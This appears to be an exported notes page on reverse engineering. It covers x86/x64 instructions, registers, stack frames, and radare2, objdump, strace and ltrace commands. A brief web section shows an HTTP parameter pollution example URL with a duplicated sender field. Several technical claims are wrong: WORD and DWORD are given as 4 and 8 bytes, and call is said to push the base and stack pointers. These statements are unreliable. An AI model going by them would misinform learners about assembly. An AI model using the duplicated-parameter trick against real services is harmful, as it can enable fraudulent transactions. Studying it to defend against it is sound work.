+<div style="break-before: page; page-break-before: always;"></div><h1 id="program-anatomy"><a class="header" href="#program-anatomy">Program Anatomy</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="instructions"><a class="header" href="#instructions">Instructions</a></h1>
+<p>Each program is comprised of a set of instructions which tell the CPU what operations it needs to perform. Different CPU architectures make use of different instruction sets, however, all of them boil down to two things - an opertation code (opcode) and optional data that the instruction operates with. These are all represented using bits - 1s and 0s.</p>
+<h3 id="mov"><a class="header" href="#mov"><code>mov</code></a></h3>
+<p>Moves the value inside one register to another:</p>
+<pre><code>mov rax, rdx
+</code></pre>
+<h3 id="lea"><a class="header" href="#lea"><code>lea</code></a></h3>
+<p>Load effective address - this instruction calculates the address of its second operand and moves it into its first operand:</p>
+<pre><code>lea rdx, [rax+0x10]
+</code></pre>
+<p>This will move <code>rax+0x10</code> inside <code>rdx</code>.</p>
+<h3 id="add"><a class="header" href="#add"><code>add</code></a></h3>
+<p>This instruction adds its operands and stores the result in its first operand:</p>
+<pre><code>add rax, rdx
+</code></pre>
+<h3 id="sub"><a class="header" href="#sub"><code>sub</code></a></h3>
+<p>This instruction subtracts the second operand from the first and stores the result in its first operand</p>
+<pre><code>sub rax, 0x9
+</code></pre>
+<h3 id="xor"><a class="header" href="#xor"><code>xor</code></a></h3>
+<p>It performs XOR-ing on its operands and stores the results into the first operand:</p>
+<pre><code>xor rdx, rax
+</code></pre>
+<p>The <code>and</code> and <code>or</code> are the same, but instead perform a binary <code>AND</code> and a binary <code>OR</code> operation, respectively.</p>
+<h3 id="push"><a class="header" href="#push"><code>push</code></a></h3>
+<p>Decreases the stack pointer (grows the stack) by 8 (4 on x86) bytes and stores the contents of its operand on the stack:</p>
+<pre><code>push rax
+</code></pre>
+<h3 id="pop"><a class="header" href="#pop"><code>pop</code></a></h3>
+<p>Increases the stack pointer (shrinks the stack) by 8 (4 on x86) bytes and stores the popped value from the stack into its operand:</p>
+<pre><code>pop rax
+</code></pre>
+<h3 id="jmp"><a class="header" href="#jmp"><code>jmp</code></a></h3>
+<p>Jumps to the address specified - used for redirecting code execution:</p>
+<pre><code>jmp 0x6A2B10
+</code></pre>
+<h3 id="call"><a class="header" href="#call"><code>call</code></a></h3>
+<p>Used for invoking procedures. It first pushes the values of the base and stack pointers onto the stack and then jumps to the specified address. After the function is finished, a <code>ret</code> instruction is issued which restores the values of the stack and base pointers from the stack and continues execution from where it left off.</p>
+<h3 id="cmp"><a class="header" href="#cmp"><code>cmp</code></a></h3>
+<p>It compares the value of its two operands and sets the according flags depending on the result:</p>
+<pre><code>cmp rax, rdx
+</code></pre>
+<p>If <code>rax</code> &lt; <code>rdx</code>, the zero flag is set to 0 and the carry flag is set to 1.</p>
+<p>If <code>rax</code> &gt; <code>rdx</code>, the zero flag is set to 0 and the carry flag is set to 0.</p>
+<p>If <code>rax</code> = <code>rdx</code>, the zero flag is set to 1 and the carry flag is set to 0.</p>
+<h3 id="jz--jnz"><a class="header" href="#jz--jnz"><code>jz</code> / <code>jnz</code></a></h3>
+<p><code>jump-if-zero</code> and <code>jump-if-not-zero</code> execute depending on the state of the zero flag.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="registers"><a class="header" href="#registers">Registers</a></h1>
+<p>Registers are value containers which reside on the CPU and not in RAM. They are small in size and some have special purposes. You may store both addresses and values in registers and depending on the instruction used, the data inside will be interpreted in a different way - this is commonly called an <em>addressing mode</em>.</p>
+<p>In x86 Intel assembly (i386), the registers are 32 bits (4 bytes) in size and some of them are reserved:</p>
+<p><code>ebp</code> - the base pointer, points to the bottom of the current stack frame</p>
+<p><code>esp</code> - the stack pointer, points to the top of the current stack frame</p>
+<p><code>eip</code> - the instruction pointer, points to the next instruction to be executed</p>
+<p>The other registers are general purpose registers and can be used for anything you like:
+<code>eax</code>, <code>ebx</code>, <code>ecx</code>, <code>edx</code>, <code>esi</code>, <code>edi</code>.</p>
+<p>x64 AMD assembly (amd64) extends these 32-bit registers to 64-bit ones and denotes these new versions by replacing the initial <code>e</code> with an <code>r</code>: <code>rbp</code>, <code>rsp</code>, <code>rip</code>, <code>rax</code>, ... It is important to note that these are <em>not</em> different registers - <code>eax</code> and <code>rax</code> refer to the same space on the CPU, however, <code>eax</code> only provides access to the lower 32 bits of the 64-bit register. You can also get access to the lower 16 and 8 bits of the register using different names:</p>
+<table><thead><tr><th align="center">8 Byte Register</th><th align="center">Lower 4 Bytes</th><th align="center">Lower 2 Bytes</th><th align="center">Lower Byte</th></tr></thead><tbody>
+<tr><td align="center">rbp</td><td align="center">ebp</td><td align="center">bp</td><td align="center">bpl</td></tr>
+<tr><td align="center">rsp</td><td align="center">esp</td><td align="center">sp</td><td align="center">spl</td></tr>
+<tr><td align="center">rip</td><td align="center">eip</td><td align="center"></td><td align="center"></td></tr>
+<tr><td align="center">rax</td><td align="center">eax</td><td align="center">ax</td><td align="center">al</td></tr>
+<tr><td align="center">rbx</td><td align="center">ebx</td><td align="center">bx</td><td align="center">bl</td></tr>
+<tr><td align="center">rcx</td><td align="center">ecx</td><td align="center">cx</td><td align="center">cl</td></tr>
+<tr><td align="center">rdx</td><td align="center">edx</td><td align="center">dx</td><td align="center">dl</td></tr>
+<tr><td align="center">rsi</td><td align="center">esi</td><td align="center">si</td><td align="center">sil</td></tr>
+<tr><td align="center">rdi</td><td align="center">edi</td><td align="center">di</td><td align="center">dil</td></tr>
+<tr><td align="center">r8</td><td align="center">r8d</td><td align="center">r8w</td><td align="center">r8b</td></tr>
+<tr><td align="center">r9</td><td align="center">r9d</td><td align="center">r9w</td><td align="center">r9b</td></tr>
+<tr><td align="center">r10</td><td align="center">r10d</td><td align="center">r10w</td><td align="center">r10b</td></tr>
+<tr><td align="center">r11</td><td align="center">r11d</td><td align="center">r11w</td><td align="center">r11b</td></tr>
+<tr><td align="center">r12</td><td align="center">r12d</td><td align="center">r12w</td><td align="center">r12b</td></tr>
+<tr><td align="center">r13</td><td align="center">r13d</td><td align="center">r13w</td><td align="center">r13b</td></tr>
+<tr><td align="center">r14</td><td align="center">r14d</td><td align="center">r14w</td><td align="center">r14b</td></tr>
+<tr><td align="center">r15</td><td align="center">r15d</td><td align="center">r15w</td><td align="center">r15b</td></tr>
+</tbody></table>
+<p>Each row contains names which refer to different parts of the <em>same</em> register. Note, you cannot access the lower 16 or 8 bits of the instruction pointer.</p>
+<p>You might sometimes see <code>WORD</code> or <code>DWORD</code> being used in a similar context - <code>WORD</code> means 4 bytes and <code>DWORD</code> means 8 bytes.</p>
+<h2 id="register-use-in-x64-linux"><a class="header" href="#register-use-in-x64-linux">Register Use in x64 Linux</a></h2>
+<p>Under x64 Linux, function arguments are passed via registers:</p>
+<pre><code>rdi:    First Argument
+rsi:    Second Argument
+rdx:    Third Argument
+rcx:    Fourth Argument
+r8:     Fifth Argument
+r9:     Sixth Argument
+</code></pre>
+<p>The return value is store in <code>rax</code> (<code>eax</code> on 32-bit machines).</p>
+<h2 id="register-dereferencing"><a class="header" href="#register-dereferencing">Register Dereferencing</a></h2>
+<p>Register dereferencing occurs when the value of the register is treated as an address to the actual data to be used, rather than the data itself. This means that addressed can be stored in registers and used later - this is useful when dealing with large data sizes.</p>
+<p>For example,</p>
+<pre><code>mov rax, [rdx]
+</code></pre>
+<p>Will check the value inside <code>rdx</code> and treat it as an address - it will go to the location where this address points and get its data from there. It will then move this data into <code>rax</code>. If we hadn't used <code>[]</code>, it would have treated the address in <code>rdx</code> simply as a value and moved it directly into <code>rax</code>.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="the-stack"><a class="header" href="#the-stack">The Stack</a></h1>
+<p>The stack is a place in memory. It's a Last-In-First-Out (LIFO) data structure, meaning that the last element to be added will be the first to get removed. Each process has access to its own stack which isn't bigger than a few megabytes. Adding data to the stack is called <em>pushing</em> onto the stack, whilst removing data is called <em>popping</em> off the stack. Although the location of the added or removed data is fixed (it's always to or from the top of the stack), existing data can still be read or written to arbitrarily.</p>
+<p>A special register is used for keeping track of the <em>top</em> of the stack - the stack pointer or <code>rsp</code>. When pushing data, the stack pointer <em>diminishes</em>, and when removing data, the stack pointer <em>augments</em>. This is because the stack grows from higher to lower memory addresses.</p>
+<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/TheStack.png" alt="" /></p>
+<h1 id="stack-frames"><a class="header" href="#stack-frames">Stack Frames</a></h1>
+<p>When a function is invoked, a <em>stack frame</em> is constructed. First, the function's arguments which do not fit into the registers are pushed on the stack, then the <em>return</em> address is also pushed. Following this, the value of a special register known as the <em>base pointer</em> (<code>rbp</code>) is saved onto the stack and the value inside the register is then updated to point to the location on the stack where we saved the base pointer.</p>
+<p>From then on, the stack pointer is used for allocating local data inside the function and the base pointer is used for accessing this data.</p>
+<pre><code class="language-cpp">long func(long a, long b, long c, long d,
+            long e, long f, long g, long h)
+{
+    long x = a * b * c * d * e * f * g * h;
+    long y = a + b + c + d + e + f + g + h;
+    long z = otherFunc(x, y);
+    return z + 20;
+}
+</code></pre>
+<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/stackframe.png" alt="" /></p>
+<p>Sometimes, the base pointer might be completely absent in optimised programs because compilers are good enough in keeping track of offsets directly from the stack pointer.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-8"><a class="header" href="#introduction-8">Introduction</a></h1>
+<p><code>radare2</code> is an open-source framework for reverse engineering. The framework includes multiple tools which all work in tandem in order to aid in the analysis of binary files. </p>
+<p>It uses short abbreviations for its commands - single letters - and many of its commands have subcommands which are also expressed as single letters. Luckily, you can always append a <code>?</code> to a specific command in order to view its subcommands and what they do.</p>
+<p>To quit <code>radare2</code>, use the <code>q</code> command.</p>
+<h1 id="loading-a-binary"><a class="header" href="#loading-a-binary">Loading a Binary</a></h1>
+<p>You can load a binary by invoking the <code>r2</code> command. You might sometimes need to also add the <code>-e io.cache=true</code> option in order to fix relocations in disassembly.</p>
+<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/load-binary.png" alt="" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="analysis"><a class="header" href="#analysis">Analysis</a></h1>
+<ul>
+<li><code>aaa</code> - analyse the binary
+<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/aaa.png" alt="" />
+<ul>
+<li><code>afl</code> - list the analysed functions
+<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/afl.png" alt="" /></li>
+<li><code>axt &lt;function&gt;</code> - list all the places where a function is called. Note, you need to use the flag name that redare automatically creates for funtions after <code>aaa</code>.
+<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/axt.png" alt="" /></li>
+</ul>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="binary-info"><a class="header" href="#binary-info">Binary Info</a></h1>
+<ul>
+<li>
+<p><code>i</code> - display file information</p>
+<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/file-metadata.png" alt="" /></p>
+<ul>
+<li>
+<p><code>ie</code> - find the program's entry point</p>
+<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/entry-point.png" alt="" /></p>
+</li>
+<li>
+<p><code>iM</code> - find the program's main function</p>
+<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/main-function.png" alt="" /></p>
+</li>
+<li>
+<p><code>iz</code> - pull the hard-coded strings from the executable (only the data sections), use <code>izz</code> to get the strings from the entire binary</p>
+<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/pull-strings.png" alt="" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="flags"><a class="header" href="#flags">Flags</a></h1>
+<p>Flags resemble bookmarks. They associate a name with a given offset in a file.</p>
+<p>Create a new flag</p>
+<pre><code>f &lt;name&gt; @ offset
+</code></pre>
+<p>You can also remove a flag by appending <code>-</code> to the command:</p>
+<pre><code>f-&lt;name&gt;
+</code></pre>
+<p>List available flags - <code>f</code>:</p>
+<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/list-flags.png" alt="" /></p>
+<p>Rename a flag</p>
+<pre><code>fr &lt;old name&gt; &lt;new name&gt;
+</code></pre>
+<h2 id="local-flags"><a class="header" href="#local-flags">Local Flags</a></h2>
+<p>Flag names should be unique for addressing reasons. However, it is often the case that you need to have simple and ubiquitous names like <code>loop</code> or <code>return</code>. For this purpose exist the so-called &quot;local&quot; flags, which are tied to the function where they reside. It is possible to add them using <code>f.</code> command:</p>
+<h1 id="flag-spaces"><a class="header" href="#flag-spaces">Flag Spaces</a></h1>
+<p>Flags can be grouped into flag spaces - is a namespace for flags, grouping together similar flags. Some flag spaces include sections, registers, symbols. These are managed with the <code>fs</code> command.</p>
+<pre><code class="language-bash">[0x00001080]&gt; fs?
+Usage: fs [*] [+-][flagspace|addr]   # Manage flagspaces
+| fs            display flagspaces
+| fs*           display flagspaces as r2 commands
+| fsj           display flagspaces in JSON
+| fs *          select all flagspaces
+| fs flagspace  select flagspace or create if it doesn't exist
+| fs-flagspace  remove flagspace
+| fs-*          remove all flagspaces
+| fs+foo        push previous flagspace and set
+| fs-           pop to the previous flagspace
+| fs-.          remove the current flagspace
+| fsq           list flagspaces in quiet mode
+| fsm [addr]    move flags at given address to the current flagspace
+| fss           display flagspaces stack
+| fss*          display flagspaces stack in r2 commands
+| fssj          display flagspaces stack in JSON
+| fsr newname   rename selected flagspace
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="seeking"><a class="header" href="#seeking">Seeking</a></h1>
+<p>Moving around the file requires the usage of the seek (<code>s</code>) command in order to change the offset at which we are. It takes one argument which is a mathematical expression capable of containing flag names, parenthesis, addition, substraction, multiplication of immediates of contents of memory using brackets. Examples:</p>
+<pre><code>[0x00000000]&gt; s 0x10
+[0x00000010]&gt; s+4
+[0x00000014]&gt; s-
+[0x00000010]&gt; s+
+[0x00000014]&gt;
+</code></pre>
+<p>Here is a list of additional seeking commands:</p>
+<pre><code>[0x00000000]&gt; s?
+Usage: s    # Help for the seek commands. See ?$? to see all variables
+| s                 Print current address
+| s.hexoff          Seek honoring a base from core-&gt;offset
+| s:pad             Print current address with N padded zeros (defaults to 8)
+| s addr            Seek to address
+| s-                Undo seek
+| s-*               Reset undo seek history
+| s- n              Seek n bytes backward
+| s--[n]            Seek blocksize bytes backward (/=n)
+| s+                Redo seek
+| s+ n              Seek n bytes forward
+| s++[n]            Seek blocksize bytes forward (/=n)
+| s[j*=!]           List undo seek history (JSON, =list, *r2, !=names, s==)
+| s/ DATA           Search for next occurrence of 'DATA'
+| s/x 9091          Search for next occurrence of \x90\x91
+| sa [[+-]a] [asz]  Seek asz (or bsize) aligned to addr
+| sb                Seek aligned to bb start
+| sC[?] string      Seek to comment matching given string
+| sf                Seek to next function (f-&gt;addr+f-&gt;size)
+| sf function       Seek to address of specified function
+| sf.               Seek to the beginning of current function
+| sg/sG             Seek begin (sg) or end (sG) of section or file
+| sl[?] [+-]line    Seek to line
+| sn/sp ([nkey])    Seek to next/prev location, as specified by scr.nkey
+| so [N]            Seek to N next opcode(s)
+| sr pc             Seek to register
+| ss                Seek silently (without adding an entry to the seek history)
+
+&gt; 3s++        ; 3 times block-seeking
+&gt; s 10+0x80   ; seek at 0x80+10
+
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="strings"><a class="header" href="#strings">Strings</a></h1>
+<ul>
+<li><code>/ &lt;string&gt;</code> - search the bytes of the binary for a specific string
+<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/search-bytes-basic.png" alt="" />
+<ul>
+<li><code>/w &lt;string&gt;</code> - search for wide character strings like Unicode symbols</li>
+</ul>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-9"><a class="header" href="#introduction-9">Introduction</a></h1>
+<p>Source code gets compiled to assembly and then assembly gets compiled to machine code. Assembly has a direct one-to-one mapping of its instructions to those in machine language. This makes assembly the only possible way to disambiguously take a look at what a program does. Assembly is essentially a human readable version of machine code.</p>
+<h2 id="intel-vs-att-syntax"><a class="header" href="#intel-vs-att-syntax">Intel vs AT&amp;T Syntax</a></h2>
+<p>There are two general syntax formats for writing Assembly - Intel and AT&amp;T. I will be using Intel throughout my notes, but here is a list of common differences between the two because you never know which one you might have to read:</p>
+<h3 id="intel"><a class="header" href="#intel">Intel</a></h3>
+<ul>
+<li>Instruction format - <code>operation destination, source</code></li>
+<li>Instruction sufixes - none</li>
+<li>Register &amp; Immediate value prefixes - none</li>
+<li>Dereferencing - done with <code>[]</code></li>
+</ul>
+<h3 id="att"><a class="header" href="#att">AT&amp;T</a></h3>
+<ul>
+<li>Instruction format - <code>operation source, destination</code></li>
+<li>Mnemonic sufixes - mnemonics have a suffix depending on the size of their operands - <code>b</code> for byte, <code>w</code> for word, <code>l</code> long
+<pre><code>movb %bl,%al
+movw %bx,%ax
+movl  %ebx,%eax
+movl (%ebx),%eax
+</code></pre>
+</li>
+<li>Register &amp; Immediate value prefixes - registers are prefixed with <code>%</code> and immediate values with <code>$</code></li>
+<li>Dereferencing - done with <code>()</code></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-engineering-with-objdump"><a class="header" href="#reverse-engineering-with-objdump">Reverse Engineering with objdump</a></h1>
+<p><code>objdump</code> is a program for displaying information from binaries. It can be used for showing different aspects of the object file. By default, it generates AT&amp;T assembly, but you can change this with the <code>-M intel</code> option.</p>
+<ul>
+<li>
+<p>disassemble everything - <code>-D</code></p>
+<pre><code>objdump -D &lt;binary&gt; -M intel
+</code></pre>
+<p><img src="Reverse%20Engineering/Resources/Images/objdump-basic.png" alt="" /></p>
+</li>
+<li>
+<p>display sections headers - <code>-h</code></p>
+<pre><code>objdump -h &lt;binary&gt;
+</code></pre>
+<p><img src="Reverse%20Engineering/Resources/Images/objdump-section-headers.png" alt="" /></p>
+</li>
+<li>
+<p>print private headers - <code>-p</code></p>
+<pre><code>objdump -p &lt;binary&gt;
+</code></pre>
+<p>Note the flags on the private headers. If the <code>x</code> flag is on, then that section is executable.</p>
+<p><img src="Reverse%20Engineering/Resources/Images/objdump-private-headers.png" alt="" /></p>
+</li>
+</ul>
+<h1 id="tracing-syscalls-with-strace"><a class="header" href="#tracing-syscalls-with-strace">Tracing syscalls with strace</a></h1>
+<p><code>strace</code> is a program for tracing what system calls a binary issues during runtime. It can be used with the following basic syntax:</p>
+<pre><code>strace &lt;binary&gt;
+</code></pre>
+<p>Note, that if the binary is in your current working directory, you will need to prepend <code>./</code> to its name because <code>strace</code> works with processes and not the actual stored binary.</p>
+<p><img src="Reverse%20Engineering/Resources/Images/strace-basic.png" alt="" /></p>
+<h1 id="tracing-library-calls-with-ltrace"><a class="header" href="#tracing-library-calls-with-ltrace">Tracing library calls with ltrace</a></h1>
+<p><code>ltrace</code> is rather similar to <code>strace</code>, but instead of system calls, it traces calls to functions in certain libraries. The syntax for it isn't unlike that for <code>strace</code>.</p>
+<pre><code>ltrace &lt;binary&gt;
+</code></pre>
+<p>Note, that if the binary is in your current working directory, you will need to prepend <code>./</code> to its name because <code>ltrace</code> works with processes and not the actual stored binary.</p>
+<p><img src="Reverse%20Engineering/Resources/Images/ltrace-basic.png" alt="" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="web-1"><a class="header" href="#web-1">Web</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-11"><a class="header" href="#overview-11">Overview</a></h1>
+<p>Different web servers handle duplicating parameters in a variety of ways. An example of duplicate parameters would be:</p>
+<pre><code>https://www.bank.com/transfer?sender=abcdef&amp;amount=1000&amp;recipient=ghijkl&amp;sender=ABCDEF
+</code></pre>
+<p>Here, there are two <code>sender=</code> parameters.</p>
+<h1 id="handling"><a class="header" href="#handling">Handling</a></h1>
+<ul>
+<li>Apache - uses the last occurrence</li>
+<li>Apache Tomcat - uses the first occurrence</li>
+<li>ASP - uses all occurrences</li>
+<li>ISP - uses all occurrences</li>
+</ul>
+<p>A more exhaustive list may be found at https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf. </p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+
+
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+
+        <script type="text/javascript">
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+
+    </body>
+</html>
